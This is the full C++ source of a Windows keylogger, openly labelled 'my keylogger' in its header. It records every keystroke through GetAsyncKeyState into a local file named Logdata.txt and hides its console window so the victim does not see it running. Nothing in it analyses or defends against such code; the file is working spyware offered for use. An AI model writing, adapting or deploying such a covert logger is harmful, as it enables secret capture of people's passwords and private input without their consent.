//============================================================================
// Name        : fuckoff.CPP
// Author      : XXXXXXX
// Version     :
// Copyright   : my keylogger btch
// Description : Hello World in C++, Ansi-style
//============================================================================

#include <iostream>
#include<fstream>
#include<winuser.h>
#include<windows.h>
using namespace std;
void log();
void hide();

int main() {
	hide();
	log();


	return 0;
}
void log()
{
	char key;// key is the input key stroke by the user
	for(;;)
	{
		for(key=8;key<223;key++)
		{
			if(GetAsyncKeyState(key) == -32767)
			{
				ofstream write("Logdata.txt",ios::app);
				if(((key>64) && (key<91)) && !(GetAsyncKeyState(0x10)))
				{
					key=key+32;
					write<<key;
					write.close();
					break;
				}
				else if((key>64) && (key<91))
				{
					write<<key;
					write.close();
					break;
				}
				else
				{
					switch(key)
					{
					case 48: if(GetAsyncKeyState(0x10))
						      write<<")";
								else
									write<<"0";
										break;
					case 49: if(GetAsyncKeyState(0x10))
											      write<<"!";
													else
														write<<"1";
															break;
					case 50: if(GetAsyncKeyState(0x10))
											      write<<"@";
													else
														write<<"2";
															break;
					case 51: if(GetAsyncKeyState(0x10))
											      write<<"#";
													else
														write<<"3";
															break;
					case 52: if(GetAsyncKeyState(0x10))
											      write<<"$";
													else
														write<<"4";
															break;
					case 53: if(GetAsyncKeyState(0x10))
												  write<<"%";
													else
														write<<"5";
															break;
					case 54: if(GetAsyncKeyState(0x10))
												  write<<"^";
													else
														write<<"6";
															break;
					case 55: if(GetAsyncKeyState(0x10))
												  write<<"&";
													else
														write<<"7";
															break;
					case 56: if(GetAsyncKeyState(0x10))
												  write<<"*";
													else
														write<<"8";
															break;
					case 57: if(GetAsyncKeyState(0x10))
												  write<<"(";
													else
														write<<"9";
															break;
					case 58:
							write<<":";
							break;
					case 43:
												write<<",";
												break;
					case 44:
												write<<"+";
												break;
					case 45:
																	write<<"-";
																	break;
					case 46:
																	write<<".";
																	break;
					case 47:
																	write<<"/";
																	break;
					case 8:write<<"<backspace>";
							   break;

				   case 27:write<<"<esc>";
				   	   	   	   break;

				   case 127:write<<"<del>";
				   	   	   	   break;

				   case 32:write<<" ";
				   	   	   	   break;

				   case 13:write<<"<enter>\n";
				   	   	   	   break;

				   case 0:write<<"<null>";
				   	   	   	   break;

				   case 1:write<<"<click>";
				   	   	   	   break;

				   case 2:write<<"<sot>";
				   	   	   	   break;

				   case 3:write<<"<eot>";
				   	   	   	   break;


					}//switch
				}//else

 			}//if
		}//for
	}//for

}//void

void hide(){
	HWND stealth;
	AllocConsole();
	stealth=FindWindowA("ConsoleWindowClass",NULL);
	ShowWindow(stealth,0);
}

